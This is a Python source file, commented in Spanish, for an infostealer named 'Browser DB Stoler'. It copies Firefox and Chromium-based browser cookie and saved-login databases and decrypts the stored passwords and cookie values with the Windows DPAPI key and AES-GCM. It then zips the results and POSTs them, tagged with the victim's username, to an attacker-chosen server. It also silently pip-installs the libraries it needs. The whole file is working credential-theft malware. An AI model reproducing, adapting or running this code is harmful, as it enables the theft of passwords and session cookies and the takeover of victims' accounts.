r"""
    Browser DB Stoler
    ~~~~~~~~~~~~~~~~~
    Roba bases de datos de navegadores web y los envia a un servidor.
    Navegadores compatibles:
        - Firefox
        - Cualquier navegador web basado en Chromium (Chrome, Edge, Vivaldi, etc...)

    @author Crizacio
    @website crizacio.com
    @date 18/10/2023
"""
import os, sys, subprocess
import configparser
import json
import sqlite3
import shutil
import base64
import win32crypt
from time import gmtime, strftime
# from Cryptodome.Cipher import AES # pip install pycryptodome
from zipfile import ZipFile
if not os.name == "nt":
	sys.exit("This script only runs on Windows.")
# SI LAS LIBRERIAS request Y pycryptodome NO ESTAN INSTALADAS, SE INSTALAN.
try:
    import requests
except ModuleNotFoundError:
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", 'requests'], stdout=subprocess.DEVNULL)
        import requests
    except:
        sys.exit()
try:
    from Crypto.Cipher import AES
except ModuleNotFoundError:
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", 'pycryptodome'], stdout=subprocess.DEVNULL)
        from Crypto.Cipher import AES
    except:
        sys.exit()

# VARIABLES CONSTANTES, PARA USO POSTERIOR.
# INCIAN DONDE ESTARA LA CARPETA TEMPORAL, EN DONDE SE COPIARAN LAS BASES DE DATOS Y SE DESCIFRARAN
SERVER_HOST_POST = None
TEMPORAL_DIRECTORY = str(f"{os.path.expanduser('~')}\\AppData\\Local\\Temp")
TEMPORAL_WORKSPACE = str(f"{TEMPORAL_DIRECTORY}\\BrowserDBStoler")

# PARA INDICAR EL SERVIDOR AL QUE ENVIARA LOS DATOS
def SetServerHostPost(host):
    global SERVER_HOST_POST
    SERVER_HOST_POST = host

# ENVIO DE UN ARCHIVO AL SERVIDOR, ESTOS SE REALIZA MEDIANTE UN POST A UN SITIO PHP
def SendFile(filePath, BrowserName = None):
    try:
        with open(filePath, 'rb') as f:
            print(requests.post(
                SERVER_HOST_POST,
                files={
                    "file": f
                },
                data={
                    "user": os.getlogin(),
                    "browser": BrowserName
                }).text
            )
    except:
        print("Error: Can't send the file.")
        return None
def GetCurrentUserFolder():
    return os.path.expanduser('~')



# START - FIREFOX --------------------------------------------------
def GetFirefoxProfile():
    try:
        config = configparser.ConfigParser()
        # LEE EL ARCHIVO PROFILES.INI PARA OBTENER LA RUTA EN DONDE SE ENCUENTRAN LOS DATOS DE ESE USUARIO
        config.read(str("{}\\AppData\\Roaming\\Mozilla\\Firefox\\profiles.ini".format(GetCurrentUserFolder())))
        firefoxProfile = str(config['Profile0']['Path'].replace("/", "\\\\"))
        return firefoxProfile
    except:
        print("Error: Firefox profile not found.")
        return None

def GetFirefoxCookies():
    try:
        firefoxProfile = GetFirefoxProfile()
        firefoxPath = str("{}\\AppData\\Roaming\\Mozilla\\Firefox\\{}\\".format(GetCurrentUserFolder(), firefoxProfile))
        zipfilePath = str('{}.zip'.format(os.getlogin()))
        # CREAMOS UNA INSTANCIA ZIPFILE Y COMPRIMIMOS EL ARCHIVO cookies.sqlite DE LA CARPETA DEL PERFIL
        with ZipFile(zipfilePath, 'w') as zip_object:
            zip_object.write(str('{}{}'.format(firefoxPath, "cookies.sqlite")))
        # ENVIAMOS EL ZIP CREADO AL SERVIDOR
        SendFile(zipfilePath, "Firefox")
    except:
        print("Error: Firefox cookies not found.")
        return None
# END - FIREFOX --------------------------------------------------



# START - Chromium based --------------------------------------------------
def GetChromiumProfile(ChromiumPath, BrowserName):
    try:
        # ABRIMOS EL ARCHIVO Local State QUE CONTIENE LOS PERFILES
        f = open(str("{}{}".format(ChromiumPath, "Local State")))
        data = json.load(f)
        retorno = []
        for i in data['profile']['info_cache']:
            retorno.append(i)
        f.close()
        # DEVOLVEMOS LA LISTA DE PERFILES DISPONIBLES
        return retorno
    except:
        print("Error: Chromium '{}' profile not found.".format(BrowserName))
        return None

def CreateTempDirectory(BrowserName):
    try:
        # PARA LIMPIAR ALGUNA INSTANCIA ANTERIOR
        if os.path.exists(TEMPORAL_WORKSPACE):
            shutil.rmtree(TEMPORAL_WORKSPACE)
        # PARA LIMPIAR LA CARPETA TEMPORAL DE TRABAJO, PARA EVITAR COPIAS ANTERIORES
        if os.path.exists(str(f"{TEMPORAL_WORKSPACE}\\{BrowserName}")):
            shutil.rmtree(str(f"{TEMPORAL_WORKSPACE}\\{BrowserName}"))
        # CREAMOS LA CARPETA TEMPORAL SI ESTA NO EXISTE
        if not os.path.exists(TEMPORAL_WORKSPACE):
            os.mkdir(TEMPORAL_WORKSPACE)
        # CREAMOS LA CARPETA TEMPORAL PARA EN NAVEGADOR
        if not os.path.exists(str(f"{TEMPORAL_WORKSPACE}\\{BrowserName}")):
            os.mkdir(str(f"{TEMPORAL_WORKSPACE}\\{BrowserName}"))
        return str(f"{TEMPORAL_WORKSPACE}\\{BrowserName}")
    except Exception as ex:
            print("Error: '{}'.".format(ex))
def CopyBrowserDataToTemp(ChromiumPath, BrowserName):
    try:
        tempDirectory = CreateTempDirectory(BrowserName)
        ChromiumProfiles = GetChromiumProfile(ChromiumPath, BrowserName)
        # COPIAMOS EL ARCHIVO Local State A NUESTRO DIRECTORIO DE TRABAJO TEMPORAL
        shutil.copyfile(str('{}{}'.format(ChromiumPath, "Local State")), str(f"{tempDirectory}\\Local State"))
        # POR CADA PERFIL EXISTENTE:
        for profile in ChromiumProfiles:
            # DEFINIMOS EL DIRECTORIO TEMPORAL PARA EL PERFIL
            profileTempPath = str(f"{tempDirectory}\\{profile}")
            # OBTENEMOS EL DIRECTORIO DEL PERFIL
            ChromiumProfilePath = str("{}{}\\".format(ChromiumPath, profile))
            # CREA LA CARPETA DEL PERFIL EN NUESTRO DIRECTORIO DE TRABAJO TEMPORAL
            if not os.path.exists(str(f"{profileTempPath}")):
                os.mkdir(str(f"{profileTempPath}"))
            # COPIA Login Data y Cookies EN EL DIRECTORIO TEMPORAL
            shutil.copyfile(str('{}{}'.format(ChromiumProfilePath, "Login Data")), str(f"{profileTempPath}\\Login Data"))
            shutil.copyfile(str('{}{}'.format(ChromiumProfilePath, "\\Network\\Cookies")), str(f"{profileTempPath}\\Cookies"))
        return [tempDirectory+"\\", ChromiumProfiles]
    except Exception as ex:
        print("Error: '{}'.".format(ex))
        return None
def ObtenerLlaveDeCifrado(ChromiumPath):
    jsonContent = None
    localstatePath = os.path.join(ChromiumPath, "Local State")
    try:
        # LEEMOS EL ARCHIVO Local State Y LO CONVERTIMOS A JSON
        with open(localstatePath, 'r') as file:
            jsonContent = json.loads(file.read())
    except:
        return None
    try:
        # OBTENEMOS LA LLAVE DE CIFRADO.
        encryption_key = base64.b64decode(jsonContent['os_crypt']['encrypted_key'])[5:]
        encryption_key = win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
        # ATENCION!
        # SOLO EL EQUIPO DE ORIGEN PUEDE DESCIFRAR CORRECTAMENTE LA LLAVE DE CIFRADO
    except:
        encryption_key = None
    return encryption_key
def DesencriptarValor(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            # not supported
            return ""
def DescifrarCookies(ChromiumPath):
    try:
        encryption_key = ObtenerLlaveDeCifrado(ChromiumPath)
        cookiesFiles = []
        print("Descifrando cookies...")
        # BUSCA EL ARCHIVO Cookies DENTRO DE LA CARPETA TEMPORAL
        for root, dir, files in os.walk(ChromiumPath):
            if "Cookies" in files:
                cookiesFiles.append(os.path.join(root, "Cookies"))
        # POR CADA ARCHIVO Cookies EN EL DIRECTORIO TEMPORAL:
        for cookie in cookiesFiles:
            # CREA UNA CONEXION PARA CONECTARSE A LA BASE DE DATOS
            conn = sqlite3.connect(cookie)
            # TRABAJAMOS EN BYTES, PARA LOS VALORES ENCRIPTADOS
            conn.text_factory = bytes
            # CREAMOS UN CURSOR PARA NAVEGAR
            cursor = conn.cursor()
            # CREAMOS UNA TABLA cocked PARA ALMACENAR LOS VALORES QUE DESCIFREMOS
            cursor.execute("CREATE TABLE IF NOT EXISTS cocked (host_key TEXT, name TEXT, decrypted_value TEXT)")
            # SELECCIONA COLUMNAS DE LA TABLA cookies
            cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')
            # POR CADA FILA DEVUELTA:
            for host_key, name, value, encrypted_value in cursor.fetchall():
                # OBTENEMOS EL DOMINIO DE LA COOKIE
                host_key = host_key.decode('utf-8')
                # OBTENEMOS EL NOMBRE DE LA COOKIE
                name = name.decode('utf-8')
                # DESCIFRAMOS EL VALOR DE LA COOKIE
                value = DesencriptarValor(encrypted_value, encryption_key)
                # GUARDAMOS EL VALOR DE LA COOKIE DESCIFRADA EN cooked.
                cursor.execute("INSERT INTO cocked VALUES (?, ?, ?);", (host_key, name, value))
            conn.commit() # APLICAMOS CAMBIOS
            conn.close() # SERRAMOS ESA CONEXION
        print("Cookies descifradas!")
    except Exception as ex:
        print("Error: '{}'.".format(ex))
def DescifrarSigning(ChromiumPath):
    # ESTO ES LO MISMO QUE EN DescrifrarCookies.
    try:
        encryption_key = ObtenerLlaveDeCifrado(ChromiumPath)
        signinFiles = []
        print("Descifrando sesiones...")
        for root, dir, files in os.walk(ChromiumPath):
            if "Login Data" in files:
                signinFiles.append(os.path.join(root, "Login Data"))
        for signin in signinFiles:
            conn = sqlite3.connect(signin)
            conn.text_factory = bytes
            cursor = conn.cursor()
            cursor.execute("CREATE TABLE IF NOT EXISTS cocked (origin_url TEXT, password_value TEXT)")
            cursor.execute('SELECT origin_url, password_value FROM logins')
            for origin_url, password_value in cursor.fetchall():
                origin_url = origin_url.decode('utf-8')
                valuePassword = DesencriptarValor(password_value, encryption_key)
                cursor.execute("INSERT INTO cocked VALUES (?, ?);", (origin_url, valuePassword))
            conn.commit()
            conn.close()
        print("Sesiones descifradas!")
    except Exception as ex:
        print("Error: '{}'.".format(ex))
def CrearArchivoEstructura(ChromiumPath, BrowserName, ChromiumInstallPath):
    try:
        # EL ARCHIVO DE ESTRUCTURA ES MAS PARA EL PANEL DE CONTROL.
        # REALMENTE, NO ES NECESARIO, PERO EN UN FUTURO TENGO PLANEADA UNA UPDATE PARA EL PANEL.
        # POR AHORA, LO METEMOS
        # INFORMACION IMPORTANTE SOBRE LA INSTANCIA
        datos = {
            "UserName": os.getlogin(),
            "ScriptDirectory": os.path.dirname(os.path.realpath(__file__)),
            "WorkingDirectory": ChromiumPath,
            "TemporalDirectory": TEMPORAL_WORKSPACE,
            "TimeAndDate": strftime("%d-%m-%Y %H:%M:%S", gmtime()),
            "WebBrowser": {
                "Name": BrowserName,
                "InstallDirectory": ChromiumInstallPath
            }
        }
        # GUARDA LOS DATOS EN UN JSON
        with open(TEMPORAL_WORKSPACE+'\\structure.json', 'w', encoding='utf-8') as f:
            json.dump(datos, f, ensure_ascii=False, indent=4)
    except Exception as ex:
        print("Error: '{}'.".format(ex))

def GetChromiumCookies(AppData_Path, BrowserName):
    try:
        # DEFINIMOS LA CARPETA DONDE ESTAN LOS DATOS DEL USUARIO
        ChromiumPath = str("{}\\AppData\\{}\\{}\\User Data\\".format(GetCurrentUserFolder(), AppData_Path, BrowserName))
        # CREAMOS EL DIRECTORIO TEMPORAL
        copiedInfo = CopyBrowserDataToTemp(ChromiumPath, BrowserName)
        # DESCIFRAMOS LAS COOKIES
        DescifrarCookies(copiedInfo[0])
        # DESCIFRAMOS LOS INICIOS DE SESION GUARDADOS DEL AUTO-COMPLETADO
        DescifrarSigning(copiedInfo[0])
        # CREAMOS EL ARCHIVO DE ESTRUCTURA PARA EL PANEL
        CrearArchivoEstructura(copiedInfo[0], BrowserName, ChromiumPath)
        # DEFINIMOS EL ZIP CON LAS COOKIES A ENVIAR
        zipfilePath = str('{}\\{}-{}'.format(TEMPORAL_DIRECTORY, os.getlogin(), BrowserName))
        # CREAMOS EL ZIP
        shutil.make_archive(zipfilePath, 'zip', TEMPORAL_WORKSPACE)
        # ENVIAMOS EL ZIP AL SERVIDOR
        SendFile(zipfilePath+".zip", BrowserName)
    except:
        print("Error: Chromium '{}' cookies not found.".format(BrowserName))
        return None
# END - Chromium based --------------------------------------------------



# START - Common Chromium based webbrowsers --------------------------------------------------
def GetChromeCookies():
    GetChromiumCookies("Local\\Google", "Chrome")

def GetEdgeCookies():
    GetChromiumCookies("Local\\Microsoft", "Edge")

def GetVivaldiCookies():
    GetChromiumCookies("Local", "Vivaldi")
# END - Common Chromium based webbrowsers --------------------------------------------------
